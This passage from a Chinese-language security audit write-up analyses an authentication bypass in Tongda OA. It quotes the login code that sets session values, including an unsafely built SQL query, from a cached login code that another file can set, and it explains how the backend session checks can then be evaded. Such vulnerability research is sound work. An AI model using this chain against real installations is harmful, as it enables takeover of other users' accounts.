$login_codeuid = TD::get_cache('CODE_LOGIN' . $CODEUID);
if (!isset($login_codeuid) || empty($login_codeuid)) `{`
    $databack = array('status' =&gt; 0, 'msg' =&gt; _('参数错误！'), 'url' =&gt; 'general/index.php?isIE=0');
    echo json_encode(td_iconv($databack, MYOA_CHARSET, 'utf-8'));
    exit;
`}`
```

这里需要满足`isset($login_codeuid) || empty($login_codeuid)`

通过搜索关键字`CODE_LOGIN`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a4b82d649237db05.png)

很简单就找到了溢出，设置cache缓存，然后输出缓存中`code_uid`的值的文件`general/login_code.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01eb39ff2e7fc06372.png)

继续回到`logincheck_code.php`,发现后面就是主要是判断一些用户是否正常,是否允许登录。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01562b92b357698e03.png)

(Ps.这个图是11.3的，只要一个参数即可。)

然后直接就是根据`$UID`查询USER表中的各个值去设置Session的操作了。

```
include_once "inc/utility_org.php";
$LOGIN_FUNC_STR = "";
$query1 = "select user_func_id_str from user_function where uid='$UID'";
$cursor1 = exequery(TD::conn(), $query1);

if ($row = mysql_fetch_array($cursor1)) `{`
    $LOGIN_FUNC_STR = $row["user_func_id_str"];
`}`

$USER_PRIV_OTHER = td_trim($USER_PRIV_OTHER);
$SYS_INTERFACE = TD::get_cache("SYS_INTERFACE");
$THEME_SELECT = $SYS_INTERFACE["THEME_SELECT"];
$THEME = $SYS_INTERFACE["THEME"];

if ($THEME_SELECT == "0") `{`
    $LOGIN_THEME = $THEME;
`}`

$LOGIN_UID = $UID;
$LOGIN_USER_ID = $USER_ID;
$LOGIN_BYNAME = $BYNAME;
$LOGIN_USER_NAME = $USERNAME;
$LOGIN_ANOTHER = "0";
$LOGIN_USER_PRIV_OTHER = $USER_PRIV_OTHER;
$LOGIN_DEPT_ID_JUNIOR = GetUnionSetOfChildDeptId($LOGIN_DEPT_ID . "," . $LOGIN_DEPT_ID_OTHER);
$LOGIN_CLIENT = 0;
$_SESSION["LOGIN_UID"] = $LOGIN_UID;
$_SESSION["LOGIN_USER_ID"] = $LOGIN_USER_ID;
$_SESSION["LOGIN_BYNAME"] = $LOGIN_BYNAME;
$_SESSION["LOGIN_USER_NAME"] = $LOGIN_USER_NAME;
$_SESSION["LOGIN_USER_PRIV"] = $LOGIN_USER_PRIV;
$_SESSION["LOGIN_USER_PRIV_OTHER"] = $LOGIN_USER_PRIV_OTHER;
$_SESSION["LOGIN_SYS_ADMIN"] = (($LOGIN_USER_PRIV == "1") || find_id($LOGIN_USER_PRIV_OTHER, "1") ? 1 : 0);
$_SESSION["LOGIN_DEPT_ID"] = $LOGIN_DEPT_ID;
$_SESSION["LOGIN_DEPT_ID_OTHER"] = $LOGIN_DEPT_ID_OTHER;
$_SESSION["LOGIN_AVATAR"] = $LOGIN_AVATAR;
$_SESSION["LOGIN_THEME"] = $LOGIN_THEME;
$_SESSION["LOGIN_FUNC_STR"] = $LOGIN_FUNC_STR;
$_SESSION["LOGIN_NOT_VIEW_USER"] = $LOGIN_NOT_VIEW_USER;
$_SESSION["LOGIN_ANOTHER"] = $LOGIN_ANOTHER;
$_SESSION["LOGIN_DEPT_ID_JUNIOR"] = $LOGIN_DEPT_ID_JUNIOR;
$_SESSION["LOGIN_CLIENT"] = $LOGIN_CLIENT;
$_SESSION["LOGIN_USER_SEX"] = $LOGIN_USER_SEX;
$IS_GROUP = 0;
```

然后我们看一下后台中的校验:

`general/index.php`中`include_once "inc/auth.inc.php";`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012e70d408943b7aa9.png)

判断用户登录主要是取这几个Session数组的值，这些值都可以被上面设置,从而可以绕过这个防护。



## 0x6 总结

​ 通达OA由于系统遗留的全局变量覆盖缺陷，功能点庞大等特性，其历史遗留问题并不容易修补,由此可以衍生非常多的攻击点。比如权限校验的不够统一，每个模块都有一次自己的校验规则，这样子其实很容易出错导致权限绕过，或者利用全局变量覆盖，可以任意调用PHP文件，并控制不同位置的参数，导致一些比如XSS之类的功能等。

共勉:

Baby, try to Audit Latest version next。



## 0x7 参考链接

[通达OA任意用户登陆分析](https://xz.aliyun.com/t/7952)

[通达OA任意文件上传+任意文件包含分析](https://0x20h.com/p/7f23.html)
